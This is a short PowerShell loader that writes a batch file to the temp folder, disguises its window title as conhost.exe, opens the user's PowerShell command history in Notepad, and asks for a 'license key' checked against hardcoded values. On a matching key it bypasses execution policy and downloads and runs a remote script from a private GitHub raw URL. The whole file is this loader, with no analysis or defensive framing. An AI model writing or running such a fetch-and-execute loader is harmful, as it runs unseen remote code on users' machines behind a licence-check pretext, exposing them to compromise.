$cmd = @"
@echo off
title C:\Windows\System32\conhost.exe
cls

set hist=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
if not exist "%hist%" type nul > "%hist%"
start notepad "%hist%"

set /p key=Enter license key: 

set valid=0

if "%key%"=="finalpremium-27BHJ" set valid=1
if "%key%"=="finalpremium-8K2LM" set valid=1
if "%key%"=="finalpremium-X91QP" set valid=1
if "%key%"=="finalpremium-55TGH" set valid=1
if "%key%"=="finalpremium-AB12Z" set valid=1
if "%key%"=="finalpremium-9PLK3" set valid=1
if "%key%"=="finalpremium-QW77E" set valid=1
if "%key%"=="finalpremium-ZX90N" set valid=1
if "%key%"=="finalpremium-MN45R" set valid=1
if "%key%"=="finalpremium-LL22X" set valid=1
if "%key%"=="Nel" set valid=1
if "%key%"=="King" set valid=1

if "%valid%"=="1" (
    powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
    echo.
    echo Successfully
) else (
    echo Invalid key
)

pause
"@

$path = "$env:TEMP\run.bat"
$cmd | Out-File -Encoding ASCII $path

Start-Process cmd -ArgumentList "/k "$path""
exit
